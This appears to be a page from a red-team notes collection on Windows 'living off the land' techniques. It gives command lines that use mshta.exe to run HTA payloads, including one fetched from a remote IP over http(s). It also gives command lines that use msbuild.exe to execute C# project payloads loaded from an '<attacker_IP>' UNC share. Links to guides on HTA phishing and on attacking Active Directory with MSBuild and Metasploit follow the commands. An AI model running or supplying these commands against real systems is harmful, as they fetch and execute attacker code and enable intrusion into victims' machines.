# Living off the Land

## 01 - MSHTA

```
C:\> mshta.exe %CD%\payload.hta

C:\> mshta.exe <drive_letter>:\absolute\path\to\payload.hta

C:\> mshta.exe http[s]://<IP>/payload.hta
```

## 02 - MSBuild

Execute C# project payloads.

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\payload.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\payload.xml
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/DotNET/CSharp/Manual|Code Execution: MSBuild]]

- [[HTA]]

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Linux/Network Ports/WebDAV|File Transfer and Data Exfiltration: Linux WebDAV Server]]

### DMCXBlue

- [DMCXBlue: HTA](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/weaponization/hta)

- [DMCXBlue: Links - HTA Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files)

### Cyber Security Corner

- [Cyber Security Corner: How to exploit Active Directory remotely by using MSBuild + Metasploit + Bloodhound](https://redblueteam.wordpress.com/2019/06/18/how-to-exploit-active-directory-remotely-by-using-unicorn-msbuild-metasploit-bloodhound/)